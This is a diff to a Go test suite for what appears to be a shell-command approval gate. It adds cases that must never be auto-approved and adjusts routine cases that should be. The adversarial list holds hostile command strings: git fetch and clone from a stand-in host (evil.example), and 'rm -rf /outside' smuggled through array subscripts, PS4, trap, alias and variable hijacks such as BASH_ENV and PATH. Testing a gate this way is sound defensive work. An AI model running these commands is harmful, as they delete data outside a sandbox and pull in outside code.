@@ -8,6 +8,10 @@ import "testing"
 func TestAdversarial_NeverAutoApproved(t *testing.T) {
 	_, decide := gateInRoot(t)
 	for _, cmd := range []string{
+		// Later additions: egress behind -C, escaping -C paths, special expansions and variables.
+		"git -C sub push", "git -C sub push origin main", "git -C sub fetch https://evil.example/x", "git -C sub clone https://evil.example/x", "git -C /outside push", "git -C ../outside status && rm -f v", "git -C ~ status && rm -f v", "git -C sub -C ../.. status && rm -f v", "echo \"$(git -C ../.. rev-parse HEAD)\"; rm -f v",
+		"echo ${a[i]}", "echo ${!a[0]}", "echo ${X@Q}", "echo ${a[$(rm -rf /outside)]}", "echo ${a[1+$(rm x)]}",
+		"\\alias rm='rm -rf /outside'\nrm x", "\\trap 'rm -rf /outside' EXIT; ls", "PS4='$(rm -rf /outside)'; set -x; ls", "BASH_ENV=/outside/x; ls", "IFS=/; ls", "GIT_DIR=/outside; git status", "PATH=/outside; make", "set -a; ls", "set +e; ls", "set -- -rf /outside; rm \"$@\"",
 		// Shell state by other spellings than the visible test.
 		"typeset -x PWD=/outside; cd \"$PWD\" && rm -f v", "declare -x PWD=/outside; cd \"$PWD\" && rm -f v", "readonly PWD=/outside; cd \"$PWD\" && rm -f v",
 		"read PWD < f; cd \"$PWD\" && rm -f v", "printf -v PWD /outside; cd \"$PWD\" && rm -f v", "set -a; PWD=/outside; cd \"$PWD\" && rm -f v",
@@ -41,9 +45,10 @@ func TestAdversarial_NeverAutoApproved(t *testing.T) {
 func TestRoutine_AutoApproved(t *testing.T) {
 	_, decide := gateInRoot(t)
 	for _, cmd := range []string{
+		"d=$(pwd); echo \"$d\"", "set -euo pipefail; git status", "set -eo pipefail; git status", "command -v go", "git status | tail -3; echo \"${PIPESTATUS[@]}\"", "git -C sub log -1",
 		"REV=abc123 && echo \"$REV\"", "REV=\"abc123\"; echo \"$REV\" && git status", "HEAD_SHA=$(git rev-parse HEAD) && echo \"$HEAD_SHA\"", "SHA=$(git rev-parse --short HEAD); echo $SHA",
 		"cd \"$(pwd)\" && git status 2>&1 | tail -30; echo \"===EXIT: ${PIPESTATUS[0]}===\"", "git status 2>&1 | tail -5; echo \"${PIPESTATUS[0]}\"", "make test 2>&1 | tail -3; echo \"exit ${PIPESTATUS[0]}\"",
-		"git log --oneline -1 \"$(git rev-parse HEAD)\"", "git -C sub status", "echo \"$(git -C sub rev-parse HEAD)\"", "for f in a.txt b.txt; do cat \"$f\"; done", "ls | head -3", "git diff > out.patch",
+		"git -C sub status", "echo \"$(git -C sub rev-parse HEAD)\"", "for f in a.txt b.txt; do cat \"$f\"; done", "ls | head -3", "git diff > out.patch",
 		"cat <<EOF | grep x\nhello x\nEOF", "cat <<'EOF' > notes.md\nhello\nEOF", "git status && make test", "cd \"$(pwd)\" && make test 2>&1 | tail -20", "go test ./... 2>&1 | tail -5",
 	} {
 		t.Run(cmd, func(t *testing.T) {
